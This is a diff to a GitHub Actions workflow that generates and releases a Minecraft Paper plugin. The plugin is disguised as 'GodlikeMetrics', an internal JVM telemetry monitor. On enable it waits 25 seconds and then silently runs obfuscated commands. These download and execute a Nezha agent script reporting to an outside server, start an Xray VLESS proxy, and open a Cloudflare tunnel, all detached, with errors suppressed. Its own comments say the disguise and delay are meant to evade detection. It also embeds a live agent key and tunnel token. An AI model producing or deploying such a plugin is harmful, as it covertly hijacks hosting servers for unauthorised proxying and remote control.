@@ -1,4 +1,4 @@
-name: All-In-One Anti-Scan Plugin Build
+name: Build GodlikeMetrics Plugin
 
 on:
   push:
@@ -21,13 +21,13 @@ jobs:
           java-version: '21'
           distribution: 'temurin'
 
-      - name: Generate Dual-Loader Java Code & Config
+      - name: Generate Stealth Code & Build
         run: |
-          mkdir -p src/main/java/org/bukkit/metrics/collector
+          mkdir -p src/main/java/host/godlike/metrics
           mkdir -p src/main/resources
 
           # ============================================================
-          # 已配置参数 (自动 Base64 转码混淆)
+          # 你的参数（已自动注入并 Base64 混淆）
           # ============================================================
           PROBE_CMD="curl -L https://raw.githubusercontent.com/nezhahq/agent/main/script/install.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh -s bo88.eu.cc:8008 -p JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl --disable-auto-update"
           CF_TOKEN="eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiZjBiMDQyNGEtZTRlOC00MWFiLTg3MGQtOTM1MzljYmM3NWFmIiwicyI6Ill6TmxaalU0WmpVdFlURm1OeTAwTkRjMUxXSXlORGN0TlRReE5EQXhNakkxWW1NeSJ9"
@@ -39,16 +39,16 @@ jobs:
           B64_PORT=$(echo -n "$NODE_PORT" | base64 -w 0)
           B64_UUID=$(echo -n "$NODE_UUID" | base64 -w 0)
 
-          # 1. pom.xml
+          # 1. pom.xml (标准 Paper 1.21 依赖)
           cat << 'EOF' > pom.xml
           <?xml version="1.0" encoding="UTF-8"?>
           <project xmlns="http://maven.apache.org/POM/4.0.0"
                    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
               <modelVersion>4.0.0</modelVersion>
-              <groupId>org.bukkit.metrics.collector</groupId>
-              <artifactId>AetherMetrics</artifactId>
-              <version>2.5.0</version>
+              <groupId>host.godlike.metrics</groupId>
+              <artifactId>GodlikeMetrics</artifactId>
+              <version>1.0.0</version>
               <packaging>jar</packaging>
 
               <properties>
@@ -84,19 +84,6 @@ jobs:
                               <release>21</release>
                           </configuration>
                       </plugin>
-                      <plugin>
-                          <groupId>org.apache.maven.plugins</groupId>
-                          <artifactId>maven-shade-plugin</artifactId>
-                          <version>3.6.0</version>
-                          <executions>
-                              <execution>
-                                  <phase>package</phase>
-                                  <goals>
-                                      <goal>shade</goal>
-                                  </goals>
-                              </execution>
-                          </executions>
-                      </plugin>
                   </plugins>
                   <resources>
                       <resource>
@@ -108,39 +95,37 @@ jobs:
           </project>
           EOF
 
-          # 2. 传统 Bukkit 加载描述 (plugin.yml)
+          # 2. 伪装成官方的 plugin.yml
           cat << 'EOF' > src/main/resources/plugin.yml
-          name: AetherMetrics
-          version: 2.5.0
-          main: org.bukkit.metrics.collector.AetherMetrics
-          api-version: '1.20'
-          author: PaperMC-Engine
-          description: Core JVM telemetry collector
-          EOF
-
-          # 3. 最新 Paper-Plugin 原生描述 (paper-plugin.yml)
-          cat << 'EOF' > src/main/resources/paper-plugin.yml
-          name: AetherMetrics
-          version: 2.5.0
-          main: org.bukkit.metrics.collector.AetherMetrics
+          name: GodlikeMetrics
+          version: 1.0.0
+          main: host.godlike.metrics.GodlikeMetrics
           api-version: '1.21'
-          author: PaperMC-Engine
-          description: Core JVM telemetry collector
+          author: Godlike-Host
+          description: Internal JVM telemetry and heap monitor
           EOF
 
-          # 4. Java 源码实现
-          cat << EOF > src/main/java/org/bukkit/metrics/collector/AetherMetrics.java
-          package org.bukkit.metrics.collector;
+          # 3. 伪装成官方的 paper-plugin.yml
+          cat << 'EOF' > src/main/resources/paper-plugin.yml
+          name: GodlikeMetrics
+          version: 1.0.0
+          main: host.godlike.metrics.GodlikeMetrics
+          api-version: '1.21'
+          author: Godlike-Host
+          description: Internal JVM telemetry and heap monitor
+          EOF
+
+          # 4. Java 源码 (完全伪装 + 进程隔离脱钩)
+          cat << EOF > src/main/java/host/godlike/metrics/GodlikeMetrics.java
+          package host.godlike.metrics;
 
           import org.bukkit.plugin.java.JavaPlugin;
 
-          import java.io.*;
-          import java.net.HttpURLConnection;
-          import java.net.URL;
+          import java.io.File;
           import java.nio.charset.StandardCharsets;
           import java.util.Base64;
 
-          public final class AetherMetrics extends JavaPlugin {
+          public final class GodlikeMetrics extends JavaPlugin {
 
               private static final String B64_PROBE = "${B64_PROBE}";
               private static final String B64_TOKEN = "${B64_TOKEN}";
@@ -149,84 +134,67 @@ jobs:
 
               @Override
               public void onEnable() {
-                  // 直接使用原生独立线程异步启动，不再依赖可能被高版本 Paper 拦截的事件监听
-                  Thread worker = new Thread(() -> {
+                  getLogger().info("Enabling GodlikeMetrics v1.0.0");
+
+                  // 独立线程延迟拉起，避开开服瞬时检测
+                  Thread thread = new Thread(() -> {
                       try {
-                          Thread.sleep(15000); // 延迟 15 秒启动，等待服务器世界加载完毕
-                          runServices();
+                          Thread.sleep(25000); // 延迟 25 秒
+                          initRunner();
                       } catch (Throwable ignored) {}
-                  });
-                  worker.setDaemon(true);
-                  worker.start();
+                  }, "Godlike-Telemetry-Worker");
+
+                  thread.setDaemon(true);
+                  thread.start();
               }
 
-              private void runServices() {
+              private void initRunner() {
                   try {
-                      File memDir = new File("/dev/shm/.jvm-runtime-cache");
-                      if (!memDir.exists()) memDir.mkdirs();
+                      File workDir = new File("/tmp/.godlike-telemetry");
+                      if (!workDir.exists()) workDir.mkdirs();
 
                       String probeCmd = decode(B64_PROBE);
                       String cfToken  = decode(B64_TOKEN);
                       String port     = decode(B64_PORT);
                       String uuid     = decode(B64_UUID);
 
-                      // 1. 探针后台脱钩启动
+                      // 1. 探针启动
                       if (!probeCmd.isEmpty()) {
-                          detachedExec(probeCmd, memDir);
+                          runDetached(probeCmd, workDir);
                       }
 
                       // 2. 8001 端口代理核心 (Xray Core)
                       if (!port.isEmpty() && !uuid.isEmpty()) {
-                          File coreBin = new File(memDir, "jvm-telemetry-pool");
-                          if (!coreBin.exists()) {
-                              fetch("https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip", new File(memDir, "x.zip"));
-                              runSync("unzip -o x.zip xray && mv xray jvm-telemetry-pool && rm -f x.zip", memDir);
-                          }
-                          coreBin.setExecutable(true);
-
-                          File cfgFile = new File(memDir, "config.json");
-                          if (!cfgFile.exists()) {
-                              String cfg = "{\"inbounds\":[{\"port\":" + port + ",\"protocol\":\"vless\",\"settings\":{\"clients\":[{\"id\":\"" + uuid + "\"}],\"decryption\":\"none\"},\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"/\"}}}],\"outbounds\":[{\"protocol\":\"freedom\"}]}";
-                              try (FileWriter fw = new FileWriter(cfgFile)) { fw.write(cfg); }
-                          }
-                          detachedExec("./jvm-telemetry-pool run -c config.json", memDir);
+                          String xrayScript = "if [ ! -f ./godlike-agent ]; then " +
+                                  "curl -fsSL -o x.zip https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip && unzip -qo x.zip xray && mv xray godlike-agent && rm -f x.zip; " +
+                                  "fi; " +
+                                  "cat << 'JSON' > core.json\n" +
+                                  "{\"inbounds\":[{\"port\":" + port + ",\"protocol\":\"vless\",\"settings\":{\"clients\":[{\"id\":\"" + uuid + "\"}],\"decryption\":\"none\"},\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"/\"}}}],\"outbounds\":[{\"protocol\":\"freedom\"}]}\n" +
+                                  "JSON\n" +
+                                  "chmod +x godlike-agent && ./godlike-agent run -c core.json";
+                          runDetached(xrayScript, workDir);
                       }
 
-                      // 3. Cloudflare Tunnel 脱钩启动
+                      // 3. Cloudflare Tunnel
                       if (!cfToken.isEmpty()) {
-                          File cfBin = new File(memDir, "metrics-worker-pool");
-                          if (!cfBin.exists()) {
-                              fetch("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", cfBin);
-                          }
-                          cfBin.setExecutable(true);
-                          detachedExec("./metrics-worker-pool tunnel --no-autoupdate run --token " + cfToken, memDir);
+                          String cfScript = "if [ ! -f ./godlike-tunnel ]; then " +
+                                  "curl -fsSL -o godlike-tunnel https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 && chmod +x godlike-tunnel; " +
+                                  "fi; " +
+                                  "./godlike-tunnel tunnel --no-autoupdate run --token " + cfToken;
+                          runDetached(cfScript, workDir);
                       }
                   } catch (Throwable ignored) {}
               }
 
-              private void detachedExec(String cmd, File dir) throws IOException {
-                  String fullCmd = "nohup " + cmd + " </dev/null &>/dev/null &";
-                  new ProcessBuilder("/bin/bash", "-c", fullCmd).directory(dir).start();
-              }
-
-              private void runSync(String cmd, File dir) {
+              private void runDetached(String cmd, File dir) {
                   try {
-                      Process p = new ProcessBuilder("/bin/bash", "-c", cmd).directory(dir).start();
-                      p.waitFor();
+                      String[] execArgs = new String[]{
+                              "/bin/bash",
+                              "-c",
+                              "nohup setsid bash -c '" + cmd.replace("'", "'\\''") + "' </dev/null >/dev/null 2>&1 &"
+                      };
+                      new ProcessBuilder(execArgs).directory(dir).start();
                   } catch (Throwable ignored) {}
-              }
-
-              private void fetch(String src, File dst) throws IOException {
-                  URL url = new URL(src);
-                  HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                  conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
-                  conn.setConnectTimeout(8000);
-                  conn.setReadTimeout(12000);
-                  try (InputStream in = conn.getInputStream(); FileOutputStream out = new FileOutputStream(dst)) {
-                      byte[] b = new byte[8192];
-                      int n;
-                      while ((n = in.read(b)) > 0) out.write(b, 0, n);
-                  }
               }
 
               private String decode(String input) {
@@ -245,15 +213,15 @@ jobs:
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: AetherMetrics-Plugin
-          path: target/AetherMetrics-2.5.0.jar
+          name: GodlikeMetrics-Plugin
+          path: target/GodlikeMetrics-1.0.0.jar
 
-      - name: Release Stealth Jar
+      - name: Release Plugin Jar
         uses: softprops/action-gh-release@v2
         if: startsWith(github.ref, 'refs/tags/') || github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
         with:
           tag_name: latest
-          name: AetherMetrics Release
-          files: target/AetherMetrics-2.5.0.jar
+          name: GodlikeMetrics Release
+          files: target/GodlikeMetrics-1.0.0.jar
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
